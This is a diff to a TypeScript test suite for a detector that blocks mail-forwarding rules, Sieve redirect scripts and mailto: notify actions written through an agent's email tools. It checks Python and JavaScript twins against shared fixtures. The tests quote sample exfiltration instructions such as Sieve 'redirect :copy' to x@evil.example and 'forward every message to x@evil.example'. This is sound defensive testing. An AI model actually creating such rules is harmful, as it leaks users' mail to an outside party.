@@ -552,19 +552,22 @@ print(json.dumps([mail_rule_forward(n, i) for n, i in json.load(sys.stdin)]))
     })
   })
 
-  it('N4 B2: narrow instruction patterns read the free text of a non-draft tool only; a plain draft stays prose', () => {
-    const narrow = (v: unknown) => hasForwardKeyName(v, true, true)
-    expect(narrow({ content: 'redirect :copy "x@evil.example";' })).toBe(true)
-    expect(narrow({ description: 'forward every message to x@evil.example' })).toBe(true)
-    expect(narrow({ body: 'FWD: all mail to x@evil.example' })).toBe(true)
+  it('N4 B2: the whole word test reads the free text of a non-draft tool (strict) only; a plain draft stays prose', () => {
+    const strict = (v: unknown) => hasForwardKeyName(v, true, true)
+    expect(strict({ content: 'redirect :copy "x@evil.example";' })).toBe(true)
+    expect(strict({ description: 'forward every message to x@evil.example' })).toBe(true)
+    expect(strict({ body: 'FWD: all mail to x@evil.example' })).toBe(true)
     expect(hasForwardKeyName({ content: 'redirect :copy "x@evil.example";' }, true, false)).toBe(false)
     expect(hasForwardKeyName({ body: 'please forward this to x@y.example' }, true, false)).toBe(false)
-    expect(narrow({ description: 'forward looking statement, mail me at some point' })).toBe(false)
-    expect(narrow({ body: 'straightforward x@y.example' })).toBe(false)
-    expect(narrow({ folder: 'forward to x@evil.example' })).toBe(false)
-    expect(narrow({ addLabelIds: ['fwd x@evil.example'] })).toBe(false)
-    expect(narrow({ body: 'forward ' + 'a'.repeat(41) + ' x@y.example' })).toBe(false)
-    expect(narrow({ body: 'redirect x@y.example' })).toBe(false)
+    // card 61fcac1e: the narrow patterns (a forward word within 40 characters of an address, a quoted redirect
+    // address) are gone; these three, which they let through, now deny in strict mode: any forward word counts,
+    // no address needed (the Sieve command name cannot be encoded, so the word test closes what the patterns could not)
+    expect(strict({ description: 'forward looking statement, mail me at some point' })).toBe(true)
+    expect(strict({ body: 'forward ' + 'a'.repeat(41) + ' x@y.example' })).toBe(true)
+    expect(strict({ body: 'redirect x@y.example' })).toBe(true)
+    expect(strict({ body: 'straightforward x@y.example' })).toBe(false)
+    expect(strict({ folder: 'forward to x@evil.example' })).toBe(false)
+    expect(strict({ addLabelIds: ['fwd x@evil.example'] })).toBe(false)
     expect(hasForwardKeyName({ action: 'fwd' })).toBe(true)
     expect(hasForwardKeyName({ x: 'offwd' })).toBe(false)
     expect(isPlainDraft(['create_draft'], ['draft'])).toBe(true)
@@ -576,5 +579,164 @@ print(json.dumps([mail_rule_forward(n, i) for n, i in json.load(sys.stdin)]))
     const known = (a: string) => a === 'known@example.com'
     expect(gateDecision('mcp__gmail__create_draft', { to: ['known@example.com'], body: 'please forward this to x@y.example' }, known)).toEqual({ deny: false })
     expect(mailToolAction('mcp__gmail__create_filter', { description: 'move newsletters to folder', action: { addLabelIds: ['X'] } })).toBe(null)
+  })
+})
+
+// card 61fcac1e N1: the free-text invariant. The prose exemption belongs to a POSITIVELY identified mail
+// tool (isPlainDraft: draft class, a mail noun in a segment, no rule / filter / script / settings /
+// automation word); every other non-reader, non-send tool has the whole word test (forward | redirect |
+// fwd, mailto:) on every string value, except the inert keys (label / folder, selectors, auto-reply text).
+// No syntax pattern: the Sieve command name cannot be encoded, so the word test closes every form.
+// The matrices are generated here from the `free_text_invariant` block of the shared fixture (the 3d6e5181
+// reviewer set), and the python twin gets the same strings.
+type Inv = {
+  sieve_tools: string[]; sieve_keys: string[]; sieve_forms: Array<{ label: string; text: string }>
+  instruction_keys: string[]; instructions: Array<{ label: string; text: string; denied: boolean }>
+  rule_like_names: string[]; rule_like_inputs: Array<{ label: string; input: unknown }>
+  plain_names: string[]; plain_segments: string[]; not_plain_segments: string[]
+  deny: Array<{ tool: string; input: unknown; note: string }>
+  allow: Array<{ tool: string; input: unknown; expected: 'draft' | null; note: string }>
+}
+const INV = (JSON.parse(readFileSync(join(EXTRACT_DIR, 'mail-tool-action-cases.json'), 'utf-8')) as { name_independent: { free_text_invariant: Inv } }).name_independent.free_text_invariant
+const KNOWN_ADDR = 'known@example.com'
+const knownOnly = (a: string) => a === KNOWN_ADDR
+
+// one python process for every call: [name, input] pairs in, {act, rule} out; [segments, classes] pairs for the plain-draft twin
+function pythonVerdicts(calls: Array<[string, unknown]>): Array<{ act: string | null; rule: boolean }> {
+  const out = execFileSync('python3', ['-I', '-c', `
+import json, sys
+sys.path.insert(0, ${JSON.stringify(EXTRACT_DIR)})
+from email_extract import mail_tool_action, mail_rule_forward
+print(json.dumps([{"act": mail_tool_action(n, i), "rule": mail_rule_forward(n, i)} for n, i in json.load(sys.stdin)]))
+`], { encoding: 'utf-8', input: JSON.stringify(calls) })
+  return JSON.parse(out.trim())
+}
+function pythonPlain(calls: Array<[string[], Array<string | null>]>): boolean[] {
+  const out = execFileSync('python3', ['-I', '-c', `
+import json, sys
+sys.path.insert(0, ${JSON.stringify(EXTRACT_DIR)})
+from email_extract import _is_plain_draft
+print(json.dumps([_is_plain_draft(s, c) for s, c in json.load(sys.stdin)]))
+`], { encoding: 'utf-8', input: JSON.stringify(calls) })
+  return JSON.parse(out.trim())
+}
+
+describe('free-text invariant (card 61fcac1e): positive plain-draft exemption, whole word test for every other tool', () => {
+  const T = (n: string) => n.split('__')[2]
+  const denyCalls: Array<[string, unknown, string]> = []
+  for (const t of INV.sieve_tools) for (const f of INV.sieve_forms) {
+    for (const k of INV.sieve_keys) denyCalls.push([t, { name: 'main', [k]: f.text }, `${f.label}/${k}`])
+    denyCalls.push([t, { name: 'main', content: JSON.stringify({ script: f.text }) }, `${f.label}/jsonstr`])
+  }
+  const nSieve = denyCalls.length
+  const instrCalls: Array<[string, unknown, string, boolean]> = []
+  for (const t of INV.sieve_tools) for (const k of INV.instruction_keys) for (const ins of INV.instructions) instrCalls.push([t, { [k]: ins.text }, `${ins.label}/${k}`, ins.denied])
+  for (const n of INV.rule_like_names) for (const i of INV.rule_like_inputs) denyCalls.push([n, i.input, `${T(n)}/${i.label}`])
+  for (const d of INV.deny) denyCalls.push([d.tool, d.input, d.note])
+  const allCalls: Array<[string, unknown]> = [
+    ...denyCalls.map((c): [string, unknown] => [c[0], c[1]]),
+    ...instrCalls.map((c): [string, unknown] => [c[0], c[1]]),
+    ...INV.allow.map((c): [string, unknown] => [c.tool, c.input]),
+  ]
+  const py = pythonVerdicts(allCalls)
+  const pyAt = (i: number) => py[i]
+
+  it('T1 T2 T3 T5 T7 T8: every denied call is a send and a mail-rule-forward deny, in both twins', () => {
+    expect(nSieve).toBe(INV.sieve_tools.length * INV.sieve_forms.length * (INV.sieve_keys.length + 1))
+    denyCalls.forEach(([tool, input, label], i) => {
+      expect(mailToolAction(tool, input), `${tool} ${label}`).toBe('send')
+      expect(mailRuleForwardJs(tool, input), `${tool} ${label}`).toBe(true)
+      expect(gateDecision(tool, input, () => true), `${tool} ${label}`).toEqual({ deny: true, kind: 'mail-rule-forward' })
+      expect(pyAt(i), `py ${tool} ${label}`).toEqual({ act: 'send', rule: true })
+    })
+  })
+
+  it('T1: the six N4-B2 Sieve forms (escaped quote, text: block, :notify tag, comment, variables, encoded character) and the N4-B3 enotify mailto: are denied in every key', () => {
+    const labels = new Set(denyCalls.slice(0, nSieve).map((c) => c[2].split('/')[0]))
+    for (const l of ['S4_escq', 'S5_textml', 'S6_notifytag', 'S7_comment', 'S8_vars', 'S9_enc', 'S12_enotify']) expect(labels.has(l), l).toBe(true)
+  })
+
+  it('F-sentences: a forward word in a rule / script / settings description denies; the F7 sentence without one stays outside (spec AC5)', () => {
+    instrCalls.forEach(([tool, input, label, denied], i) => {
+      const at = denyCalls.length + i
+      expect(mailRuleForwardJs(tool, input), `${tool} ${label}`).toBe(denied)
+      expect(pyAt(at).rule, `py ${tool} ${label}`).toBe(denied)
+      expect(pyAt(at).act, `py ${tool} ${label}`).toBe(denied ? 'send' : mailToolAction(tool, input))
+    })
+    expect(INV.instructions.filter((x) => !x.denied).map((x) => x.label)).toEqual(['F7_copy'])
+  })
+
+  it('T3 T4: isPlainDraft is positive in both twins (rule-like names and a draft verb with no mail noun are not plain)', () => {
+    for (const s of INV.plain_segments) expect(isPlainDraft([s], ['draft']), s).toBe(true)
+    for (const s of INV.not_plain_segments) expect(isPlainDraft([s], ['draft']), s).toBe(false)
+    expect(isPlainDraft(['create_draft'], [null])).toBe(false) // the name classifier does not call it a draft
+    const calls: Array<[string[], Array<string | null>]> = [...INV.plain_segments, ...INV.not_plain_segments].map((s) => [[s], ['draft']])
+    expect(pythonPlain(calls)).toEqual([...INV.plain_segments.map(() => true), ...INV.not_plain_segments.map(() => false)])
+    // a compound name is plain only when no segment is rule-like
+    expect(isPlainDraft(['server', 'create_draft'], ['nonsend', 'draft'])).toBe(true)
+    expect(isPlainDraft(['rules', 'create_draft'], ['nonsend', 'draft'])).toBe(false)
+  })
+
+  it('T4: a plain draft keeps its prose (a forward instruction in a body is a letter, the ledger checks the recipients)', () => {
+    const body = { to: [KNOWN_ADDR], subject: 'Fwd: x', body: 'please forward this to x@y.example', html: '<a href="mailto:x@y.example">x</a>' }
+    for (const n of INV.plain_names) {
+      expect(mailToolAction(n, body), n).toBe('draft')
+      expect(mailRuleForwardJs(n, body), n).toBe(false)
+      expect(gateDecision(n, body, knownOnly).kind, n).not.toBe('mail-rule-forward')
+      expect(pythonVerdicts([[n, body]])[0], `py ${n}`).toEqual({ act: 'draft', rule: false })
+    }
+  })
+
+  it('T5 T6: the plain draft file keys, the inert selector / auto-reply keys and the calendar prose stay allowed, in both twins', () => {
+    const base = denyCalls.length + instrCalls.length
+    INV.allow.forEach((c, i) => {
+      expect(mailToolAction(c.tool, c.input), c.note).toBe(c.expected)
+      expect(mailRuleForwardJs(c.tool, c.input), c.note).toBe(false)
+      expect(pyAt(base + i), `py ${c.note}`).toEqual({ act: c.expected, rule: false })
+    })
+  })
+
+  it('T9 hasForwardKeyName strict: file keys are exempt in a plain draft only, the value words and mailto: apply to everything else', () => {
+    const strict = (v: unknown) => hasForwardKeyName(v, true, true)
+    const plain = (v: unknown) => hasForwardKeyName(v, true, false)
+    // file keys: exempt in a plain draft, word-tested in strict mode
+    for (const v of [{ attachments: [{ filename: 'fwd_invoice.pdf' }] }, { attachments: ['/tmp/Fwd_ajanlat.pdf'] }, { fileName: 'Fwd_invoice.pdf' },
+      { path: 'Forwarded_invoice.pdf' }, { filePath: '/tmp/redirect.txt' }, { attachmentPaths: ['fwd.pdf'] }]) {
+      expect(plain(v), JSON.stringify(v)).toBe(false)
+      expect(strict(v), JSON.stringify(v)).toBe(true)
+    }
+    // a header value is neither prose nor a file key
+    expect(plain({ headers: { 'X-Tag': 'fwd' } })).toBe(true)
+    // mailto: is a forward sign in strict mode only, and not inside an exempt key
+    expect(strict({ html: '<a href="mailto:a@b.hu">a</a>' })).toBe(true)
+    expect(plain({ html: '<a href="mailto:a@b.hu">a</a>' })).toBe(false)
+    expect(strict({ x: 'mailto:a@b.hu' })).toBe(true)
+    expect(plain({ x: 'mailto:a@b.hu' })).toBe(false)
+    expect(strict({ signature: 'mailto:a@b.hu', query: 'mailto:' })).toBe(false) // inert keys
+    expect(strict({ path: 'mailto:a@b.hu' })).toBe(true) // a file key is exempt in a plain draft only
+    // inert keys: never word-tested in either mode
+    const inert = { query: 'subject:Fwd', q: 'forward', search: 'Fwd', keyword: 'redirect', keywords: ['forward'], signature: 'fwd',
+      responseBodyPlainText: 'look forward', responseBodyHtml: 'forward', internalReplyMessage: 'forward', externalReplyMessage: 'redirect', autoReplyMessage: 'fwd',
+      label: 'Forwarded', folder: 'Forwarded Items', mailbox: 'Forwarded' }
+    expect(strict(inert)).toBe(false)
+    expect(plain(inert)).toBe(false)
+    // ... but a forwarding KEY is a forward in every mode, under an inert or a prose key too
+    expect(strict({ query: '{"forwardTo":"x"}' })).toBe(true)
+    expect(plain({ signature: { forwardTo: 'x' } })).toBe(true)
+    expect(plain({ responseBodyPlainText: '{"redirectTo":"x"}' })).toBe(true)
+    // the bounds still fail closed (depth, node count, a string too long to parse), in both modes
+    let deep: Record<string, unknown> = { a: 1 }
+    for (let i = 0; i < 40; i++) deep = { n: deep }
+    for (const mode of [strict, plain]) {
+      expect(mode(deep)).toBe(true)
+      expect(mode({ l: Array.from({ length: 6000 }, (_, i) => i) })).toBe(true)
+      expect(mode({ b: '{' + 'a'.repeat(100001) })).toBe(true)
+      expect(mode('x')).toBe(true)
+    }
+  })
+
+  it('AC9: hasForwardKey (the 6151bb4d rule branch) counts mailto: as a forward sign, a filter write with it is a send', () => {
+    expect(hasForwardKey({ action: { notify: 'mailto:' } })).toBe(true)
+    expect(hasForwardKey({ criteria: { subject: 'invoice' } })).toBe(false)
   })
 })
